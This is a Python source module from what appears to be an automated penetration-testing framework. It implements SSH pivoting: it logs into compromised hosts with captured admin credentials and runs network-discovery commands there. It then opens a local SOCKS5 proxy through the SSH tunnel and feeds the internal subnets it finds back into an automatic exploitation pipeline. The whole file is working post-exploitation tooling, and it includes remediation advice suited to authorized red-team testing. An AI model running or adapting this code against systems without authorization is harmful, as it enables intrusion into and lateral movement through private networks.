"""SSH tunnel pivoting -- SOCKS proxy and port forwards through compromised hosts.

When we have SSH admin credentials on a host, this module:
1. Establishes an SSH connection via paramiko
2. Discovers internal networks reachable from the compromised host
3. Sets up local SOCKS5 proxies or port forwards
4. Adds discovered internal CIDRs as facts, triggering the full
   enumeration pipeline on internal networks automatically

The key insight: once tunnels are set up and internal CIDRs are added
as facts, the planner's existing auto-chaining handles everything.
New hosts get discovered, enumerated, vuln scanned, exploited -- the
full pipeline runs on internal networks via the tunnel.
"""

from __future__ import annotations

import asyncio
import ipaddress
import logging
import re
import select
import socket
import socketserver
import struct
import threading
from typing import TYPE_CHECKING, Any

from pacdoor.core.models import (
    Evidence,
    ExploitSafety,
    Finding,
    Host,
    Phase,
    Severity,
)
from pacdoor.modules.base import BaseModule

if TYPE_CHECKING:
    from pacdoor.modules.base import ModuleContext

log = logging.getLogger(__name__)

# Maximum concurrent tunnels to prevent resource exhaustion.
_MAX_TUNNELS = 5

# SSH connection timeout in seconds.
_SSH_TIMEOUT = 15

# Base port for SOCKS proxies (1080, 1081, 1082, ...).
_SOCKS_BASE_PORT = 1080

# Commands to run on compromised host for internal network discovery.
_DISCOVERY_COMMANDS: list[tuple[str, str]] = [
    ("ip route 2>/dev/null || route -n 2>/dev/null", "routes"),
    ("arp -a 2>/dev/null || ip neigh 2>/dev/null", "arp_table"),
    ("cat /etc/resolv.conf 2>/dev/null", "dns_config"),
    ("netstat -rn 2>/dev/null || ip route show table all 2>/dev/null", "routing_table"),
    ("hostname -I 2>/dev/null || ifconfig 2>/dev/null | grep inet", "interfaces"),
]

# Regex patterns for extracting network information.
_CIDR_PATTERN = re.compile(r"(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/\d{1,2})")
_IP_PATTERN = re.compile(r"(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})")

# ── Optional-import helper ────────────────────────────────────────────────

_paramiko_available: bool | None = None


def _check_paramiko() -> bool:
    global _paramiko_available  # noqa: PLW0603
    if _paramiko_available is not None:
        return _paramiko_available
    try:
        import paramiko  # noqa: F401
        _paramiko_available = True
    except ImportError:
        log.debug("paramiko not installed -- SSH pivot module unavailable")
        _paramiko_available = False
    return _paramiko_available


# ── SOCKS5 proxy server ──────────────────────────────────────────────────


class _Socks5Handler(socketserver.BaseRequestHandler):
    """Minimal SOCKS5 proxy handler that forwards through an SSH channel."""

    # Set by the tunnel manager before starting the server.
    ssh_transport: Any = None

    def handle(self) -> None:
        try:
            # SOCKS5 greeting
            data = self.request.recv(256)
            if not data or data[0:1] != b"\x05":
                return
            # No auth required
            self.request.sendall(b"\x05\x00")

            # SOCKS5 connect request
            data = self.request.recv(256)
            if not data or len(data) < 7:
                return
            if data[1:2] != b"\x01":  # CONNECT
                self.request.sendall(b"\x05\x07\x00\x01\x00\x00\x00\x00\x00\x00")
                return

            addr_type = data[3]
            if addr_type == 1:  # IPv4
                dest_addr = socket.inet_ntoa(data[4:8])
                dest_port = struct.unpack("!H", data[8:10])[0]
            elif addr_type == 3:  # Domain name
                name_len = data[4]
                dest_addr = data[5:5 + name_len].decode("utf-8")
                dest_port = struct.unpack("!H", data[5 + name_len:7 + name_len])[0]
            elif addr_type == 4:  # IPv6
                dest_addr = socket.inet_ntop(socket.AF_INET6, data[4:20])
                dest_port = struct.unpack("!H", data[20:22])[0]
            else:
                self.request.sendall(b"\x05\x08\x00\x01\x00\x00\x00\x00\x00\x00")
                return

            # Open channel through SSH transport
            transport = self.__class__.ssh_transport
            if transport is None or not transport.is_active():
                self.request.sendall(b"\x05\x01\x00\x01\x00\x00\x00\x00\x00\x00")
                return

            try:
                channel = transport.open_channel(
                    "direct-tcpip",
                    (dest_addr, dest_port),
                    self.request.getpeername(),
                    timeout=10,
                )
            except Exception:
                self.request.sendall(b"\x05\x05\x00\x01\x00\x00\x00\x00\x00\x00")
                return

            if channel is None:
                self.request.sendall(b"\x05\x05\x00\x01\x00\x00\x00\x00\x00\x00")
                return

            # Success response
            self.request.sendall(b"\x05\x00\x00\x01\x00\x00\x00\x00\x00\x00")

            # Bidirectional forwarding
            while True:
                r, _w, _x = select.select([self.request, channel], [], [], 1)
                if self.request in r:
                    data = self.request.recv(4096)
                    if not data:
                        break
                    channel.sendall(data)
                if channel in r:
                    data = channel.recv(4096)
                    if not data:
                        break
                    self.request.sendall(data)

            channel.close()
        except Exception:
            pass


class _ThreadedSocksServer(socketserver.ThreadingMixIn, socketserver.TCPServer):
    allow_reuse_address = True
    daemon_threads = True


# ── Tunnel management ─────────────────────────────────────────────────────


class TunnelInfo:
    """Metadata for an active SSH tunnel."""

    __slots__ = (
        "local_port", "remote_host", "remote_port", "via_host",
        "via_ip", "tunnel_type", "ssh_client", "socks_server",
        "server_thread",
    )

    def __init__(
        self,
        local_port: int,
        via_host: str,
        via_ip: str,
        tunnel_type: str = "socks5",
        remote_host: str = "",
        remote_port: int = 0,
    ) -> None:
        self.local_port = local_port
        self.remote_host = remote_host
        self.remote_port = remote_port
        self.via_host = via_host
        self.via_ip = via_ip
        self.tunnel_type = tunnel_type
        self.ssh_client: Any = None
        self.socks_server: _ThreadedSocksServer | None = None
        self.server_thread: threading.Thread | None = None


# Global tunnel registry for cleanup on shutdown.
_active_tunnels: list[TunnelInfo] = []
_tunnel_lock = threading.Lock()


def _register_tunnel(tunnel: TunnelInfo) -> None:
    with _tunnel_lock:
        _active_tunnels.append(tunnel)


def _tunnel_count() -> int:
    with _tunnel_lock:
        return len(_active_tunnels)


def cleanup_all_tunnels() -> None:
    """Close all active SSH tunnels and SOCKS servers.

    Called during engine shutdown to release resources.
    """
    with _tunnel_lock:
        tunnels = list(_active_tunnels)
        _active_tunnels.clear()

    for tunnel in tunnels:
        try:
            if tunnel.socks_server:
                tunnel.socks_server.shutdown()
        except Exception:
            pass
        try:
            if tunnel.ssh_client:
                tunnel.ssh_client.close()
        except Exception:
            pass

    if tunnels:
        log.debug("Cleaned up %d SSH tunnels", len(tunnels))


# ── SSH operations (synchronous, run via asyncio.to_thread) ───────────────


def _ssh_connect(
    ip: str,
    username: str,
    password: str,
) -> Any:
    """Establish an SSH connection and return the paramiko client."""
    import paramiko

    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(
        ip,
        port=22,
        username=username,
        password=password,
        timeout=_SSH_TIMEOUT,
        allow_agent=False,
        look_for_keys=False,
    )
    return client


def _ssh_exec(client: Any, command: str, timeout: int = 10) -> str:
    """Execute a command on the remote host and return stdout."""
    try:
        _stdin, stdout, _stderr = client.exec_command(command, timeout=timeout)
        return stdout.read().decode("utf-8", errors="replace")
    except Exception:
        return ""


def _discover_internal_networks(client: Any) -> tuple[list[str], list[str], dict[str, str]]:
    """Run discovery commands on the compromised host.

    Returns:
        (cidrs, internal_ips, raw_outputs) where cidrs are network ranges,
        internal_ips are individual hosts, and raw_outputs is command->output.
    """
    cidrs: set[str] = set()
    internal_ips: set[str] = set()
    raw_outputs: dict[str, str] = {}

    # Get the host's own addresses to exclude from "discovered" IPs.
    own_output = _ssh_exec(client, "hostname -I 2>/dev/null")
    own_ips = set(_IP_PATTERN.findall(own_output))

    for command, label in _DISCOVERY_COMMANDS:
        output = _ssh_exec(client, command)
        if not output.strip():
            continue
        raw_outputs[label] = output.strip()

        # Extract CIDRs.
        for cidr in _CIDR_PATTERN.findall(output):
            try:
                net = ipaddress.ip_network(cidr, strict=False)
                # Skip default route, loopback, link-local.
                if (
                    net.is_loopback
                    or net.is_link_local
                    or str(net) == "0.0.0.0/0"
                    or net.prefixlen == 0
                ):
                    continue
                cidrs.add(str(net))
            except ValueError:
                continue

        # Extract individual IPs from ARP / neighbor tables.
        if label in ("arp_table", "interfaces"):
            for ip_str in _IP_PATTERN.findall(output):
                try:
                    addr = ipaddress.ip_address(ip_str)
                    if addr.is_loopback or addr.is_link_local:
                        continue
                    if ip_str not in own_ips:
                        internal_ips.add(ip_str)
                except ValueError:
                    continue

    return sorted(cidrs), sorted(internal_ips), raw_outputs


def _setup_socks_proxy(client: Any, local_port: int) -> _ThreadedSocksServer | None:
    """Set up a local SOCKS5 proxy server forwarding through the SSH tunnel."""
    transport = client.get_transport()
    if not transport or not transport.is_active():
        return None

    # Create a handler class with the transport bound.
    handler_class = type(
        "_BoundSocks5Handler",
        (_Socks5Handler,),
        {"ssh_transport": transport},
    )

    try:
        server = _ThreadedSocksServer(("127.0.0.1", local_port), handler_class)
        thread = threading.Thread(target=server.serve_forever, daemon=True)
        thread.start()
        return server
    except OSError as exc:
        log.debug("Failed to bind SOCKS proxy on port %d: %s", local_port, exc)
        return None


# ── Module ────────────────────────────────────────────────────────────────


class SSHPivotModule(BaseModule):
    """SSH tunnel pivoting through compromised hosts to internal networks.

    Sets up SOCKS5 proxies and discovers internal networks reachable
    from hosts where we have SSH admin credentials.  Discovered internal
    CIDRs are added as facts, triggering the full scan pipeline on
    internal networks automatically.
    """

    name = "post.ssh_pivot"
    description = "SSH tunnel pivoting to discover and access internal networks"
    phase = Phase.POST_EXPLOIT
    attack_technique_ids = ["T1572"]
    required_facts = ["credential.admin", "service.ssh"]
    produced_facts = ["pivot.tunnel"]
    safety = ExploitSafety.MODERATE

    def __init__(self) -> None:
        # Track (host_ip, username) combos already pivoted to avoid redundancy.
        self._pivoted: set[tuple[str, str]] = set()

    async def check(self, ctx: ModuleContext) -> bool:
        """Pre-check: need admin creds + SSH service + paramiko installed."""
        if not _check_paramiko():
            return False
        if not await ctx.facts.has("credential.admin"):
            return False
        return await ctx.facts.has("service.ssh")

    async def run(self, ctx: ModuleContext) -> list[Finding]:
        findings: list[Finding] = []

        admin_creds = await ctx.facts.get_all("credential.admin")
        if not admin_creds:
            return findings

        ssh_services = await ctx.facts.get_values("service.ssh")
        if not ssh_services:
            return findings

        # Build host_id -> IP lookup and set of hosts with SSH.
        hosts = await ctx.facts.get_values("host")
        host_ip_map: dict[str, str] = {h.id: h.ip for h in hosts}

        ssh_host_ids: set[str] = set()
        for svc in ssh_services:
            if hasattr(svc, "host_id"):
                ssh_host_ids.add(svc.host_id)

        for fact in admin_creds:
            if _tunnel_count() >= _MAX_TUNNELS:
                log.debug("Maximum tunnel count (%d) reached, skipping further pivots", _MAX_TUNNELS)
                break

            cred = fact.value
            cred_host_id = fact.host_id
            if not cred_host_id or cred_host_id not in ssh_host_ids:
                continue

            ip = host_ip_map.get(cred_host_id)
            if not ip:
                continue

            username = cred.username if hasattr(cred, "username") else str(cred.get("username", ""))
            password = cred.value if hasattr(cred, "value") else str(cred.get("value", ""))
            if not username or not password:
                continue

            # Skip if we've already pivoted through this host with this user.
            pivot_key = (ip, username)
            if pivot_key in self._pivoted:
                continue
            self._pivoted.add(pivot_key)

            # Skip NTLM hashes -- SSH needs actual passwords.
            cred_type = str(cred.cred_type) if hasattr(cred, "cred_type") else str(cred.get("cred_type", ""))
            if "ntlm" in cred_type.lower() or "hash" in cred_type.lower():
                continue

            await ctx.rate_limiter.acquire()

            try:
                pivot_findings = await self._pivot_through_host(
                    ctx, ip, username, password, cred_host_id,
                )
                findings.extend(pivot_findings)
            except Exception as exc:
                log.debug("SSH pivot through %s failed: %s", ip, exc)

        return findings

    async def _pivot_through_host(
        self,
        ctx: ModuleContext,
        ip: str,
        username: str,
        password: str,
        host_id: str,
    ) -> list[Finding]:
        """Establish SSH tunnel and discover internal networks."""
        findings: list[Finding] = []

        # Connect via SSH (blocking, run in thread).
        try:
            client = await asyncio.to_thread(_ssh_connect, ip, username, password)
        except Exception as exc:
            log.debug("SSH connection to %s failed: %s", ip, exc)
            return findings

        # Discover internal networks.
        cidrs, internal_ips, raw_outputs = await asyncio.to_thread(
            _discover_internal_networks, client,
        )

        if not cidrs and not internal_ips:
            client.close()
            return findings

        # Set up SOCKS5 proxy.
        local_port = _SOCKS_BASE_PORT + _tunnel_count()
        socks_server = await asyncio.to_thread(_setup_socks_proxy, client, local_port)

        if not socks_server:
            client.close()
            return findings

        # Register the tunnel.
        tunnel = TunnelInfo(
            local_port=local_port,
            via_host=host_id,
            via_ip=ip,
            tunnel_type="socks5",
        )
        tunnel.ssh_client = client
        tunnel.socks_server = socks_server
        _register_tunnel(tunnel)

        # Add tunnel as a fact.
        tunnel_fact = {
            "local_port": local_port,
            "via_host": host_id,
            "via_ip": ip,
            "tunnel_type": "socks5",
            "cidrs": cidrs,
            "internal_ips": internal_ips,
        }
        await ctx.facts.add("pivot.tunnel", tunnel_fact, self.name, host_id=host_id)

        # Build evidence text.
        evidence_parts = [
            f"SOCKS5 proxy: 127.0.0.1:{local_port} via {ip}",
            f"Discovered CIDRs: {', '.join(cidrs) if cidrs else 'none'}",
            f"Discovered internal IPs: {', '.join(internal_ips[:20]) if internal_ips else 'none'}",
        ]
        for label, output in raw_outputs.items():
            # Truncate long outputs.
            truncated = output[:500] + "..." if len(output) > 500 else output
            evidence_parts.append(f"[{label}]\n{truncated}")

        # Record in attack graph.
        pivot_desc = (
            f"SSH pivot through {ip} as {username} -- "
            f"SOCKS5 on 127.0.0.1:{local_port}, "
            f"discovered {len(cidrs)} CIDRs, {len(internal_ips)} internal hosts"
        )
        path = ctx.attack_graph.add_step(
            from_host_id=host_id,
            to_host_id=host_id,  # Self-referential: pivot point
            technique_id="T1572",
            description=pivot_desc,
        )
        if ctx.db is not None:
            await ctx.db.insert_attack_path(path)

        # Add discovered CIDRs as facts to trigger the scan pipeline.
        for cidr in cidrs:
            await ctx.facts.add("cidr", cidr, self.name)

            # Also seed individual hosts from smaller subnets.
            try:
                net = ipaddress.ip_network(cidr, strict=False)
                if net.num_addresses <= 256:  # /24 or smaller
                    for addr in net.hosts():
                        new_host = Host(ip=str(addr))
                        await ctx.facts.add("host", new_host, self.name)
                        if ctx.db is not None:
                            await ctx.db.insert_host(new_host)
            except ValueError:
                continue

        # Add individual discovered internal IPs as hosts.
        for internal_ip in internal_ips:
            new_host = Host(ip=internal_ip)
            await ctx.facts.add("host", new_host, self.name)
            if ctx.db is not None:
                await ctx.db.insert_host(new_host)

        # Produce finding.
        finding = Finding(
            title=f"SSH pivot established through {ip} -- internal networks discovered",
            description=(
                f"Established SOCKS5 proxy on 127.0.0.1:{local_port} through "
                f"compromised host {ip} (user: {username}). "
                f"Discovered {len(cidrs)} internal network(s) and "
                f"{len(internal_ips)} internal host(s). "
                f"Internal CIDRs: {', '.join(cidrs) if cidrs else 'none'}. "
                f"These networks have been added to the scan pipeline for "
                f"automatic enumeration and exploitation."
            ),
            severity=Severity.CRITICAL,
            host_id=host_id,
            module_name=self.name,
            attack_technique_ids=["T1572"],
            evidence=[
                Evidence(kind="pivot_tunnel", data="\n".join(evidence_parts)),
                Evidence(kind="attack_path_step", data=f"Step {path.step_order}: {pivot_desc}"),
            ],
            remediation=(
                "Segment internal networks from DMZ and externally-facing hosts. "
                "Implement strict firewall rules preventing compromised hosts from "
                "routing to sensitive internal subnets. Deploy network monitoring "
                "to detect unusual SSH tunneling and SOCKS proxy traffic. "
                "Use jump boxes with MFA for legitimate administrative access "
                "and disable direct SSH between untrusted network segments."
            ),
            verified=True,
        )
        findings.append(finding)

        if ctx.db is not None:
            await ctx.db.insert_finding(finding)

        return findings
